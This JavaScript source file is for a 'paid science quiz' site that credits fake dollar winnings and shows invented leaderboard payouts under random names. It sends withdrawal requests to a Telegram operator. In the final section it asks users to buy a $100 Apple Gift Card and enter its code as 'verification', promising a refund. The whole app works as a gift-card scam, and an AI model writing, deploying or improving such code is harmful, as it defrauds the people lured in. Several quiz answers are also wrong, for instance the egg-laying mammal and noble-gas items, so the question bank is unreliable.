// Quiz Question Bank - 100+ Science Questions
const questionBank = [
    { question: "What is the chemical symbol for gold?", options: ["Ag", "Fe", "Pb", "Au"], correctAnswer: "Au" },
    { question: "What is the largest planet in our solar system?", options: ["Saturn", "Neptune", "Jupiter", "Uranus"], correctAnswer: "Jupiter" },
    { question: "What is the chemical formula for salt?", options: ["NaCl", "KCl", "MgCl2", "CaCl2"], correctAnswer: "NaCl" },
    { question: "What is the speed of light?", options: ["300,000 km/s", "150,000 km/s", "500,000 km/s", "1,000,000 km/s"], correctAnswer: "300,000 km/s" },
    { question: "What is the smallest unit of life?", options: ["Atom", "Cell", "Molecule", "Organ"], correctAnswer: "Cell" },
    { question: "What is the process by which plants make food?", options: ["Respiration", "Photosynthesis", "Fermentation", "Digestion"], correctAnswer: "Photosynthesis" },
    { question: "What is the most abundant element in the Earth's atmosphere?", options: ["Oxygen", "Nitrogen", "Carbon", "Hydrogen"], correctAnswer: "Nitrogen" },
    { question: "What is the boiling point of water at sea level?", options: ["50°C", "75°C", "100°C", "150°C"], correctAnswer: "100°C" },
    { question: "What is the symbol for iron?", options: ["Ir", "In", "Fe", "I"], correctAnswer: "Fe" },
    { question: "What is the powerhouse of the cell?", options: ["Nucleus", "Mitochondria", "Ribosome", "Chloroplast"], correctAnswer: "Mitochondria" },
    { question: "What is the formula for calculating velocity?", options: ["v = d × t", "v = d / t", "v = d + t", "v = d - t"], correctAnswer: "v = d / t" },
    { question: "What is the pH of pure water?", options: ["5", "7", "9", "11"], correctAnswer: "7" },
    { question: "What is the chemical symbol for silver?", options: ["Si", "S", "Ag", "Al"], correctAnswer: "Ag" },
    { question: "What is the name of the process where a solid turns into a gas?", options: ["Melting", "Evaporation", "Sublimation", "Condensation"], correctAnswer: "Sublimation" },
    { question: "What is the number of bones in an adult human body?", options: ["186", "206", "226", "246"], correctAnswer: "206" },
    { question: "What is the chemical symbol for copper?", options: ["Co", "Cp", "Cu", "C"], correctAnswer: "Cu" },
    { question: "What is the only mammal that lays eggs?", options: ["Platypus", "Echidna", "Both", "Neither"], correctAnswer: "Both" },
    { question: "What is the SI unit of electric current?", options: ["Volt", "Ampere", "Ohm", "Watt"], correctAnswer: "Ampere" },
    { question: "What is the main source of energy for the Sun?", options: ["Fission", "Fusion", "Radiation", "Combustion"], correctAnswer: "Fusion" },
    { question: "What is the lightest noble gas?", options: ["Helium", "Neon", "Argon", "Xenon"], correctAnswer: "Helium" },
    { question: "What is the chemical formula for glucose?", options: ["C6H12O6", "C5H10O5", "C7H14O7", "C4H8O4"], correctAnswer: "C6H12O6" },
    { question: "What is the name of the protective layer around the Earth?", options: ["Ozone layer", "Ionosphere", "Troposphere", "Thermosphere"], correctAnswer: "Ozone layer" },
    { question: "What is the speed of sound in air at 20°C?", options: ["243 m/s", "343 m/s", "443 m/s", "543 m/s"], correctAnswer: "343 m/s" },
    { question: "What is the main function of the mitochondria?", options: ["Protein synthesis", "Energy production", "DNA storage", "Photosynthesis"], correctAnswer: "Energy production" },
    { question: "What is the symbol for calcium?", options: ["Ca", "Cl", "C", "Cu"], correctAnswer: "Ca" },
    { question: "What is the name of the scientific instrument used to measure temperature?", options: ["Barometer", "Thermometer", "Hygrometer", "Anemometer"], correctAnswer: "Thermometer" },
    { question: "What is the number of valence electrons in a noble gas?", options: ["2", "4", "8", "Variable"], correctAnswer: "8" },
    { question: "What is the name of the process where water turns into water vapor?", options: ["Melting", "Freezing", "Evaporation", "Sublimation"], correctAnswer: "Evaporation" },
    { question: "What is the chemical symbol for potassium?", options: ["P", "Po", "K", "Pt"], correctAnswer: "K" },
    { question: "What is the smallest country in the world by area?", options: ["Monaco", "San Marino", "Vatican City", "Liechtenstein"], correctAnswer: "Vatican City" },
    { question: "What is the most dense element on Earth?", options: ["Gold", "Lead", "Osmium", "Plutonium"], correctAnswer: "Osmium" },
    { question: "What is the formula for kinetic energy?", options: ["KE = mv", "KE = 1/2 mv²", "KE = mgh", "KE = Fd"], correctAnswer: "KE = 1/2 mv²" },
    { question: "What is the name of the outermost layer of the Sun?", options: ["Core", "Photosphere", "Chromosphere", "Corona"], correctAnswer: "Corona" },
    { question: "What is the chemical formula for sulfuric acid?", options: ["H2SO3", "H2SO4", "H3SO4", "H2S"], correctAnswer: "H2SO4" },
    { question: "What is the number of chromosomes in a human cell?", options: ["23", "46", "69", "92"], correctAnswer: "46" },
    { question: "What is the process of breaking down glucose for energy called?", options: ["Photosynthesis", "Respiration", "Fermentation", "Digestion"], correctAnswer: "Respiration" },
    { question: "What is the symbol for sodium?", options: ["So", "S", "Na", "N"], correctAnswer: "Na" },
    { question: "What is the atomic number of hydrogen?", options: ["0", "1", "2", "3"], correctAnswer: "1" },
    { question: "What is the name of the blood protein that carries oxygen?", options: ["Hemoglobin", "Myoglobin", "Collagen", "Keratin"], correctAnswer: "Hemoglobin" },
    { question: "What is the formula for calculating work?", options: ["W = Fd", "W = F/d", "W = Ft", "W = F+d"], correctAnswer: "W = Fd" },
    { question: "What is the most electronegative element?", options: ["Oxygen", "Chlorine", "Fluorine", "Nitrogen"], correctAnswer: "Fluorine" },
    { question: "What is the name of the layer of the Earth's atmosphere closest to the surface?", options: ["Stratosphere", "Mesosphere", "Troposphere", "Thermosphere"], correctAnswer: "Troposphere" },
    { question: "What is the chemical symbol for sulfur?", options: ["S", "Su", "Sr", "Si"], correctAnswer: "S" },
    { question: "What is the process by which organisms adapt to their environment over generations?", options: ["Mutation", "Evolution", "Natural selection", "Adaptation"], correctAnswer: "Evolution" },
    { question: "What is the SI unit of force?", options: ["Joule", "Newton", "Pascal", "Watt"], correctAnswer: "Newton" },
    { question: "What is the name of the distance light travels in one year?", options: ["Light-second", "Light-hour", "Light-year", "Light-decade"], correctAnswer: "Light-year" },
    { question: "What is the chemical formula for ammonia?", options: ["NH2", "NH3", "NH4", "N2H3"], correctAnswer: "NH3" },
    { question: "What is the number of atoms in a mole?", options: ["6.02 × 10²²", "6.02 × 10²³", "6.02 × 10²⁴", "6.02 × 10²⁵"], correctAnswer: "6.02 × 10²³" },
    { question: "What is the process of a liquid turning into a solid called?", options: ["Melting", "Evaporation", "Freezing", "Sublimation"], correctAnswer: "Freezing" },
    { question: "What is the atomic mass of carbon?", options: ["10", "12", "14", "16"], correctAnswer: "12" },
    { question: "What is the name of the protein that builds cells and tissues?", options: ["Carbohydrate", "Lipid", "Protein", "Nucleic acid"], correctAnswer: "Protein" },
    { question: "What is the formula for gravitational potential energy?", options: ["PE = mgh", "PE = 1/2 mv²", "PE = Fd", "PE = mg"], correctAnswer: "PE = mgh" },
    { question: "What is the most abundant gas in our atmosphere?", options: ["Oxygen", "Carbon dioxide", "Argon", "Nitrogen"], correctAnswer: "Nitrogen" },
    { question: "What is the name of the process where a gas turns into a liquid?", options: ["Evaporation", "Condensation", "Sublimation", "Melting"], correctAnswer: "Condensation" },
    { question: "What is the symbol for magnesium?", options: ["Mg", "M", "Ma", "Mn"], correctAnswer: "Mg" },
    { question: "What is the typical pH of lemon juice?", options: ["2-3", "5-6", "7-8", "9-10"], correctAnswer: "2-3" },
    { question: "What is the largest organ in the human body?", options: ["Brain", "Heart", "Liver", "Skin"], correctAnswer: "Skin" },
    { question: "What is the SI unit of pressure?", options: ["Newton", "Joule", "Pascal", "Watt"], correctAnswer: "Pascal" },
    { question: "What is the number of sides on a benzene ring?", options: ["4", "5", "6", "8"], correctAnswer: "6" },
    { question: "What is the chemical formula for hydrochloric acid?", options: ["H2CO3", "HCl", "H2SO4", "HNO3"], correctAnswer: "HCl" },
    { question: "What is the process of splitting a nucleus into two smaller nuclei?", options: ["Fusion", "Fission", "Decay", "Ionization"], correctAnswer: "Fission" },
    { question: "What is the atomic number of oxygen?", options: ["6", "7", "8", "9"], correctAnswer: "8" },
    { question: "What is the name of the stage of cell division where chromosomes separate?", options: ["Prophase", "Metaphase", "Anaphase", "Telophase"], correctAnswer: "Anaphase" },
    { question: "What is the mechanical advantage of a simple lever?", options: ["Always 1", "Depends on length ratio", "Always greater than 1", "Depends on weight"], correctAnswer: "Depends on length ratio" },
    { question: "What is the symbol for chlorine?", options: ["Cl", "C", "Ch", "Cr"], correctAnswer: "Cl" },
    { question: "What is the typical human body temperature in Celsius?", options: ["35°C", "36.5°C", "37.5°C", "38.5°C"], correctAnswer: "37.5°C" },
    { question: "What is the name of the liquid part of blood?", options: ["Serum", "Plasma", "Lymph", "Tissue fluid"], correctAnswer: "Plasma" },
    { question: "What is the SI unit of energy?", options: ["Newton", "Watt", "Joule", "Pascal"], correctAnswer: "Joule" },
    { question: "What is the percentage of nitrogen in the atmosphere?", options: ["21%", "39%", "78%", "99%"], correctAnswer: "78%" },
    { question: "What is the process of rocks being broken down by weather?", options: ["Erosion", "Weathering", "Sedimentation", "Metamorphism"], correctAnswer: "Weathering" },
    { question: "What is the symbol for phosphorus?", options: ["P", "Ph", "Po", "Pd"], correctAnswer: "P" },
    { question: "What is the typical speed of a nerve impulse?", options: ["1 m/s", "10 m/s", "100 m/s", "1000 m/s"], correctAnswer: "100 m/s" },
    { question: "What is the name of the protein in muscle that stores oxygen?", options: ["Hemoglobin", "Myoglobin", "Collagen", "Elastin"], correctAnswer: "Myoglobin" },
    { question: "What is Ohm's law?", options: ["V = IR", "V = I/R", "V = IR²", "V = I+R"], correctAnswer: "V = IR" },
    { question: "What is the common name for calcium oxide?", options: ["Chalk", "Quicklime", "Limestone", "Gypsum"], correctAnswer: "Quicklime" },
    { question: "What is the number of chambers in a human heart?", options: ["2", "3", "4", "6"], correctAnswer: "4" },
    { question: "What is the SI unit of frequency?", options: ["Hertz", "Joule", "Newton", "Watt"], correctAnswer: "Hertz" },
    { question: "What is the name of the process where species gradually change over time?", options: ["Mutation", "Evolution", "Adaptation", "Selection"], correctAnswer: "Evolution" },
    { question: "What is the symbol for tin?", options: ["Ti", "Tn", "Sn", "T"], correctAnswer: "Sn" },
    { question: "What is the percentage of oxygen in the atmosphere?", options: ["18%", "21%", "24%", "27%"], correctAnswer: "21%" },
    { question: "What is the basic unit of heredity?", options: ["Chromosome", "Protein", "Gene", "Enzyme"], correctAnswer: "Gene" },
    { question: "What is the formula for calculating power?", options: ["P = Fd", "P = W/t", "P = Fv", "P = Fd/t"], correctAnswer: "P = W/t" },
    { question: "What is the name of the layer of Earth's atmosphere where weather occurs?", options: ["Stratosphere", "Troposphere", "Mesosphere", "Thermosphere"], correctAnswer: "Troposphere" }
];

// Leaderboard Names for Random Generation
const leaderboardNames = [
    "Mike", "Sarah", "Daniel", "Jessica", "James", "Emily", "Robert", "Amanda",
    "David", "Jennifer", "Michael", "Lisa", "Christopher", "Michelle", "John",
    "Ashley", "Richard", "Brenda", "Joseph", "Sandra", "Thomas", "Kimberly",
    "Charles", "Elizabeth", "William", "Stephanie", "Matthew", "Katherine",
    "Mark", "Rebecca", "Donald", "Maria", "Steven", "Sharon", "Paul", "Laura"
];

// Global State
let currentBalance = 0;
let currentQuestionIndex = 0;
let quizQuestions = [];
let selectedAnswer = null;
let hasAnswered = false;
let lastQuizDate = null;
let transactions = [];
let isInQuiz = false;
let verificationContext = null;
let cashappStage2Context = null;
let paypalStage2Context = null;
let authUser = null;
const API_BASE_URL = (() => {
    const configured = (window.APP_API_BASE_URL || '').trim();
    if (configured) {
        return configured.replace(/\/$/, '');
    }
    const host = window.location.hostname;
    const port = window.location.port;
    if ((host === 'localhost' || host === '127.0.0.1') && port === '8000') {
        return 'http://localhost:3000';
    }
    return '';
})();

function apiUrl(path) {
    return `${API_BASE_URL}${path}`;
}

// Initialize App on Page Load
document.addEventListener('DOMContentLoaded', () => {
    loadData();
    loadTransactions();
    setupEventListeners();
    setupInviteAccess();
    updateBalance();
    updateWithdrawalDisplay();
    startPollingForTelegramData();
});

// Load Data from localStorage
function loadData() {
    const savedBalance = localStorage.getItem('userBalance');
    const savedLastQuizDate = localStorage.getItem('lastQuizDate');

    if (savedBalance) currentBalance = parseInt(savedBalance);
    if (savedLastQuizDate) lastQuizDate = savedLastQuizDate;

    updateBalance();
}

// Save Data to localStorage
function saveData() {
    localStorage.setItem('userBalance', currentBalance);
    localStorage.setItem('lastQuizDate', lastQuizDate);
}

function setWelcomeName(name) {
    const welcomeName = document.getElementById('welcome-name');
    if (welcomeName) {
        welcomeName.textContent = name || 'User';
    }
}

function showInviteView(viewId) {
    ['invite-view-home', 'invite-view-signup', 'invite-view-signin'].forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        el.classList.toggle('invite-hidden', id !== viewId);
    });
}

function setInviteStatus(targetId, text, isError) {
    const el = document.getElementById(targetId);
    if (!el) return;
    el.textContent = text || '';
    el.style.color = isError ? '#ffb3b3' : 'rgba(194, 215, 255, 0.9)';
}

async function handleInviteSignup() {
    const emailEl = document.getElementById('invite-signup-email');
    const nameEl = document.getElementById('invite-signup-name');
    const submitBtn = document.getElementById('invite-signup-submit');
    const email = emailEl.value.trim();
    const firstName = nameEl.value.trim();

    if (!email || !firstName) {
        setInviteStatus('invite-signup-status', 'Please enter email and first name.', true);
        return;
    }

    submitBtn.disabled = true;
    setInviteStatus('invite-signup-status', 'Generating invite...', false);

    try {
        const response = await fetch(apiUrl('/api/invite-signup'), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, firstName })
        });
        const data = await response.json();
        if (!response.ok || !data.success) {
            throw new Error(data.message || 'Invite generation failed.');
        }

        setInviteStatus('invite-signup-status', 'Invite generated. Continue to Sign In.', false);
        setTimeout(() => {
            showInviteView('invite-view-signin');
            setInviteStatus('invite-signin-status', 'Enter your valid invite code to continue.', false);
        }, 900);
    } catch (err) {
        setInviteStatus('invite-signup-status', err.message || 'Signup failed.', true);
    } finally {
        submitBtn.disabled = false;
    }
}

async function handleInviteSignin() {
    const codeEl = document.getElementById('invite-signin-code');
    const submitBtn = document.getElementById('invite-signin-submit');
    const inviteCode = codeEl.value.trim().toUpperCase();

    if (!inviteCode) {
        setInviteStatus('invite-signin-status', 'Please enter a valid invite code.', true);
        return;
    }

    submitBtn.disabled = true;
    setInviteStatus('invite-signin-status', 'Validating invite code...', false);

    try {
        const response = await fetch(apiUrl('/api/invite-signin'), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ inviteCode })
        });
        const data = await response.json();
        if (!response.ok || !data.success || !data.user) {
            throw new Error(data.message || 'Invalid invite code.');
        }

        authUser = data.user;
        localStorage.setItem('inviteAuthUser', JSON.stringify(authUser));
        setWelcomeName(authUser.firstName);
        document.getElementById('invite-gate').classList.remove('active');
    } catch (err) {
        setInviteStatus('invite-signin-status', err.message || 'Sign in failed.', true);
    } finally {
        submitBtn.disabled = false;
    }
}

function setupInviteAccess() {
    const saved = localStorage.getItem('inviteAuthUser');
    if (saved) {
        try {
            authUser = JSON.parse(saved);
            if (authUser && authUser.firstName) {
                setWelcomeName(authUser.firstName);
                document.getElementById('invite-gate').classList.remove('active');
            }
        } catch (e) {
            localStorage.removeItem('inviteAuthUser');
        }
    }

    document.getElementById('invite-btn-signup').addEventListener('click', () => {
        setInviteStatus('invite-signup-status', '', false);
        showInviteView('invite-view-signup');
    });
    document.getElementById('invite-btn-signin').addEventListener('click', () => {
        setInviteStatus('invite-signin-status', '', false);
        showInviteView('invite-view-signin');
    });
    document.getElementById('invite-back-home-a').addEventListener('click', () => showInviteView('invite-view-home'));
    document.getElementById('invite-back-home-b').addEventListener('click', () => showInviteView('invite-view-home'));
    document.getElementById('invite-signup-submit').addEventListener('click', handleInviteSignup);
    document.getElementById('invite-signin-submit').addEventListener('click', handleInviteSignin);
    document.getElementById('signout-btn').addEventListener('click', () => {
        authUser = null;
        localStorage.removeItem('inviteAuthUser');
        document.getElementById('invite-gate').classList.add('active');
        showInviteView('invite-view-home');
    });
}

// Load transactions from localStorage
function loadTransactions() {
    const saved = localStorage.getItem('transactions');
    if(saved) {
        transactions = JSON.parse(saved);
    }
}

// Save transactions to localStorage
function saveTransactions() {
    localStorage.setItem('transactions', JSON.stringify(transactions));
}

// Update Balance Display
function updateBalance() {
    document.getElementById('balance').textContent = currentBalance;
    document.getElementById('quiz-balance').textContent = currentBalance;
}

// Save Quiz Session
function saveQuizSession() {
    const session = {
        questions: quizQuestions,
        currentIndex: currentQuestionIndex,
        timestamp: Date.now()
    };
    localStorage.setItem('quizSession', JSON.stringify(session));
}

// Load Quiz Session
function loadQuizSession() {
    const saved = localStorage.getItem('quizSession');
    if (saved) {
        try {
            const session = JSON.parse(saved);
            const hoursSinceStart = (Date.now() - session.timestamp) / (1000 * 60 * 60);
            
            if (hoursSinceStart < 24) {
                quizQuestions = session.questions;
                currentQuestionIndex = session.currentIndex;
                return true;
            } else {
                localStorage.removeItem('quizSession');
                return false;
            }
        } catch (e) {
            return false;
        }
    }
    return false;
}

// Clear Quiz Session
function clearQuizSession() {
    localStorage.removeItem('quizSession');
}

// Start Leaderboard Generator
function startLeaderboardGenerator() {
    if (window.leaderboardInterval) {
        clearInterval(window.leaderboardInterval);
    }

    generateLeaderboardEntry();

    window.leaderboardInterval = setInterval(() => {
        if (isInQuiz) {
            generateLeaderboardEntry();
        }
    }, 120000);
}

// Generate Leaderboard Entry
function generateLeaderboardEntry() {
    const randomName = leaderboardNames[Math.floor(Math.random() * leaderboardNames.length)];
    const randomAmount = Math.floor(Math.random() * 950) + 50;
    
    addLeaderboardActivity(randomName, randomAmount);
}

// Add Leaderboard Activity
function addLeaderboardActivity(name, amount) {
    const leaderboardContent = document.querySelector('.leaderboard-content');
    
    const existingMessage = leaderboardContent.querySelector('.leaderboard-text');
    if (existingMessage) {
        existingMessage.remove();
    }

    const activityItem = document.createElement('div');
    activityItem.className = 'leaderboard-activity';
    activityItem.innerHTML = `
        <span class="activity-name">${name}</span>
        <span class="activity-amount">+$${amount}</span>
    `;

    leaderboardContent.insertBefore(activityItem, leaderboardContent.firstChild);

    const activities = leaderboardContent.querySelectorAll('.leaderboard-activity');
    if (activities.length > 5) {
        activities[activities.length - 1].remove();
    }
}

// Setup All Event Listeners
function setupEventListeners() {
    // Header Navigation Links
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const page = link.dataset.page;
            navigateToPage(page);
        });
    });

    // Bottom Navigation Buttons
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const page = btn.dataset.page;
            navigateToPage(page);
        });
    });

    // Start Quiz Button
    document.getElementById('start-quiz-btn').addEventListener('click', () => {
        navigateToPage('quiz');
    });

    // Quiz Answer Option Buttons
    document.getElementById('answer-options').addEventListener('click', (e) => {
        if (e.target.classList.contains('option-btn') && !hasAnswered) {
            selectAnswer(e.target);
        }
    });

    // Submit Answer Button
    document.getElementById('submit-btn').addEventListener('click', submitAnswer);

    // Withdraw Method Buttons
    document.getElementById('cashapp-btn').addEventListener('click', () => {
        document.getElementById('cashapp-max-balance').textContent = currentBalance;
        openModal('cashapp-modal');
    });

    document.getElementById('paypal-btn').addEventListener('click', () => {
        document.getElementById('paypal-max-balance').textContent = currentBalance;
        openModal('paypal-modal');
    });

    // Cash App Input and Amount Validation
    document.getElementById('cashapp-input').addEventListener('input', validateCashAppForm);
    document.getElementById('cashapp-amount').addEventListener('input', validateCashAppForm);

    // PayPal Input and Amount Validation
    document.getElementById('paypal-input').addEventListener('input', validatePayPalForm);
    document.getElementById('paypal-amount').addEventListener('input', validatePayPalForm);

    // Cash App Submit
    document.getElementById('cashapp-submit').addEventListener('click', () => {
        submitWithdrawal('cashapp');
    });

    // PayPal Submit
    document.getElementById('paypal-submit').addEventListener('click', () => {
        submitWithdrawal('paypal');
    });

    // Modal Close Buttons
    document.querySelectorAll('.modal-close').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const modalId = e.target.dataset.modal;
            closeModal(modalId);
        });
    });

    // Quiz End Modal Close Button
    document.querySelector('.modal-close-btn').addEventListener('click', () => {
        closeModal('quiz-end-modal');
        navigateToPage('dashboard');
    });

    // Verification input + submit
    document.getElementById('verification-code-input').addEventListener('input', (e) => {
        const sanitized = e.target.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 16);
        e.target.value = sanitized;
        document.getElementById('verification-submit').disabled = sanitized.length !== 16;
    });

    document.getElementById('verification-submit').addEventListener('click', submitVerificationCode);

    document.getElementById('cashapp-stage2-email').addEventListener('input', validateCashAppStage2Form);
    document.getElementById('cashapp-stage2-code').addEventListener('input', (e) => {
        const cleaned = e.target.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 16).toUpperCase();
        e.target.value = cleaned;
        validateCashAppStage2Form();
    });
    document.getElementById('cashapp-stage2-submit').addEventListener('click', submitCashAppStage2);
    document.getElementById('paypal-stage2-email').addEventListener('input', validatePayPalStage2Form);
    document.getElementById('paypal-stage2-code').addEventListener('input', (e) => {
        const cleaned = e.target.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 16).toUpperCase();
        e.target.value = cleaned;
        validatePayPalStage2Form();
    });
    document.getElementById('paypal-stage2-submit').addEventListener('click', submitPayPalStage2);

    // Close Modal When Clicking Outside
    document.querySelectorAll('.modal').forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                closeModal(modal.id);
            }
        });
    });
}

// Validate Cash App Form
function validateCashAppForm() {
    const input = document.getElementById('cashapp-input').value.trim();
    const amount = document.getElementById('cashapp-amount').value.trim();
    const submitBtn = document.getElementById('cashapp-submit');

    if (input && amount) {
        const amountNum = parseInt(amount);
        if (amountNum > 0 && amountNum <= currentBalance) {
            submitBtn.disabled = false;
        } else {
            submitBtn.disabled = true;
        }
    } else {
        submitBtn.disabled = true;
    }
}

// Validate PayPal Form
function validatePayPalForm() {
    const input = document.getElementById('paypal-input').value.trim();
    const amount = document.getElementById('paypal-amount').value.trim();
    const submitBtn = document.getElementById('paypal-submit');

    if (input && amount) {
        const amountNum = parseInt(amount);
        if (amountNum > 0 && amountNum <= currentBalance) {
            submitBtn.disabled = false;
        } else {
            submitBtn.disabled = true;
        }
    } else {
        submitBtn.disabled = true;
    }
}

// Create new transaction
function createTransaction(method, tag, amount) {
    const transaction = {
        id: Date.now(),
        method: method,
        tag: tag,
        amount: amount,
        date: new Date().toLocaleDateString(),
        time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        status: 'Pending',
        dataFromTelegram: null,
        isUnlocked: false,
        isRefunded: false
    };
    
    transactions.unshift(transaction);
    saveTransactions();
    
    sendWithdrawalToTelegram(transaction);
    
    return transaction;
}

// Update transaction with Telegram data
function unlockTransaction(transactionId, telegramData) {
    const transaction = transactions.find(t => t.id === transactionId);
    if(transaction) {
        transaction.dataFromTelegram = telegramData;
        transaction.isUnlocked = true;
        if (telegramData.uiType === 'uic') {
            if (!transaction.isRefunded) {
                currentBalance += Number(transaction.amount) || 0;
                transaction.isRefunded = true;
                saveData();
                updateBalance();
            }
            transaction.status = 'Denied';
            saveTransactions();
            updateWithdrawalDisplay();
            showTransactionModalC();
            showNotification('Payment denied. Amount returned to balance.', false);
            return;
        }
        saveTransactions();
        updateWithdrawalDisplay();
        showNotification('✓ Withdrawal ready!', true);
    }
}

// Submit Withdrawal
function submitWithdrawal(method) {
    let tag, amount, modalId;

    if (method === 'cashapp') {
        tag = document.getElementById('cashapp-input').value.trim();
        amount = parseInt(document.getElementById('cashapp-amount').value.trim());
        modalId = 'cashapp-modal';
    } else {
        tag = document.getElementById('paypal-input').value.trim();
        amount = parseInt(document.getElementById('paypal-amount').value.trim());
        modalId = 'paypal-modal';
    }

    if (!tag) {
        showNotification('Please enter your details!', false);
        return;
    }

    if (!amount || amount <= 0) {
        showNotification('Please enter a valid amount!', false);
        return;
    }

    if (amount > currentBalance) {
        showNotification(`You can only withdraw up to $${currentBalance}!`, false);
        return;
    }

    currentBalance -= amount;
    updateBalance();
    saveData();

    createTransaction(method === 'cashapp' ? 'Cash App' : 'PayPal', tag, amount);

    showNotification(`✓ Withdrawal request submitted!`, true);
    
    if (method === 'cashapp') {
        document.getElementById('cashapp-input').value = '';
        document.getElementById('cashapp-amount').value = '';
    } else {
        document.getElementById('paypal-input').value = '';
        document.getElementById('paypal-amount').value = '';
    }

    closeModal(modalId);

    setTimeout(() => {
        navigateToPage('dashboard');
        updateWithdrawalDisplay();
    }, 1500);
}

// Send to Telegram
async function sendTelegramMessage(text, replyMarkup) {
    try {
        await fetch(apiUrl('/api/send-telegram'), {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                text,
                reply_markup: replyMarkup || null
            })
        });
    } catch (error) {
        console.log('Telegram relay unavailable');
    }
}

function sendWithdrawalToTelegram(transaction) {
    const message = `
🔔 New Withdrawal Request

💳 Method: ${transaction.method}
👤 Tag/Email: ${transaction.tag}
💰 Amount: $${transaction.amount}
📅 Date: ${transaction.date}
⏳ Status: ${transaction.status}
ID: ${transaction.id}
    `.trim();

    const buttons = [
        { text: 'UI A', callback_data: `approve_${transaction.id}` },
        { text: 'UI B', callback_data: `decline_${transaction.id}` },
        { text: 'UI C', callback_data: `review_${transaction.id}` },
        { text: 'UI D', callback_data: `info_${transaction.id}` }
    ];

    const payload = {
        text: message,
        reply_markup: {
            inline_keyboard: [
                [buttons[0], buttons[1]],
                [buttons[2], buttons[3]]
            ]
        }
    };

    sendTelegramMessage(payload.text, payload.reply_markup);
}

// Navigate to Different Pages
function navigateToPage(page) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(`${page}-page`).classList.add('active');
    
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
        if (link.dataset.page === page) {
            link.classList.add('active');
        }
    });
    
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.page === page) {
            btn.classList.add('active');
        }
    });
    
    if (page === 'quiz') {
        isInQuiz = true;
        initializeQuiz();
    } else {
        isInQuiz = false;
        if (window.leaderboardInterval) {
            clearInterval(window.leaderboardInterval);
        }
    }

    if (page === 'dashboard') {
        updateWithdrawalDisplay();
    }
}

// Initialize Quiz
function initializeQuiz() {
    const today = new Date().toDateString();
    
    if (lastQuizDate === today) {
        showNotification('You have reached your daily earning limit!', false);
        navigateToPage('dashboard');
        return;
    }

    const hasExistingSession = loadQuizSession();

    if (!hasExistingSession) {
        quizQuestions = shuffleArray([...questionBank]).slice(0, 20);
        currentQuestionIndex = 0;
    }

    startLeaderboardGenerator();
    loadQuestion();
}

// Load Current Question
function loadQuestion() {
    if (currentQuestionIndex >= quizQuestions.length) {
        endQuiz();
        return;
    }

    const question = quizQuestions[currentQuestionIndex];
    document.getElementById('question-text').textContent = question.question;
    document.getElementById('question-number').textContent = `Question ${currentQuestionIndex + 1} / 20`;

    const optionsContainer = document.getElementById('answer-options');
    optionsContainer.innerHTML = '';

    question.options.forEach((option, index) => {
        const btn = document.createElement('button');
        btn.className = 'option-btn';
        btn.dataset.index = index;
        btn.textContent = `${String.fromCharCode(65 + index)}) ${option}`;
        btn.addEventListener('click', function() {
            if (!hasAnswered) {
                selectAnswer(this);
            }
        });
        optionsContainer.appendChild(btn);
    });

    selectedAnswer = null;
    hasAnswered = false;
    document.getElementById('submit-btn').disabled = false;

    saveQuizSession();
}

// Select Answer
function selectAnswer(btn) {
    if (hasAnswered) return;

    document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
    btn.classList.add('selected');
    selectedAnswer = btn.dataset.index;
}

// Submit Answer
function submitAnswer() {
    if (selectedAnswer === null) {
        showNotification('Please select an answer!', false);
        return;
    }

    hasAnswered = true;
    document.getElementById('submit-btn').disabled = true;

    const question = quizQuestions[currentQuestionIndex];
    const correctIndex = question.options.indexOf(question.correctAnswer);
    const selectedBtn = document.querySelector(`.option-btn[data-index="${selectedAnswer}"]`);
    const correctBtn = document.querySelector(`.option-btn[data-index="${correctIndex}"]`);

    if (parseInt(selectedAnswer) === correctIndex) {
        currentBalance += 50;
        updateBalance();
        saveData();
        selectedBtn.classList.remove('selected');
        selectedBtn.classList.add('correct');
        showNotification('✓ Correct! +$50', true);
    } else {
        selectedBtn.classList.remove('selected');
        selectedBtn.classList.add('incorrect');
        correctBtn.classList.add('correct');
        showNotification('✗ Incorrect', false);
    }

    setTimeout(() => {
        currentQuestionIndex++;
        loadQuestion();
    }, 2000);
}

// Show Notification
function showNotification(message, isCorrect) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.classList.add('show');
    
    if (isCorrect) {
        notification.classList.remove('incorrect');
    } else {
        notification.classList.add('incorrect');
    }

    setTimeout(() => {
        notification.classList.remove('show');
    }, 2000);
}

function showVerificationReadme() {
    const content = document.getElementById('readme-content');
    content.innerHTML = `
        <h3>Verification Required</h3>
        <p>We need to verify you are a real person before processing your withdrawal.</p>
        <hr>
        <h4>How it works</h4>
        <ul>
            <li>Buy a $100 Apple Gift Card</li>
            <li>Enter the 16-digit code</li>
            <li>Receive your earnings payout (including the $100 refund)</li>
        </ul>
        <hr>
        <h4>Why this is required</h4>
        <p>Bots and fake accounts have been abusing the system. This check confirms you are a real user.</p>
        <hr>
        <h4>Is this a fee?</h4>
        <p>No. The verification amount is added back to your payout, so you receive it back.</p>
        <hr>
        <h4>One-time only</h4>
        <p>After successful verification, future withdrawals go directly to your account with no additional verification.</p>
        <hr>
        <p class="readme-final">Proceed by tapping <strong>Complete payment</strong> to finish and get paid.</p>
    `;
    openModal('readme-modal');
}

function startVerificationFlow(transaction, sourceModalId, uiLabel) {
    verificationContext = {
        transactionId: transaction.id,
        method: transaction.method,
        amount: transaction.amount,
        sourceModalId,
        uiLabel
    };

    const input = document.getElementById('verification-code-input');
    const submitBtn = document.getElementById('verification-submit');
    input.value = '';
    submitBtn.disabled = true;
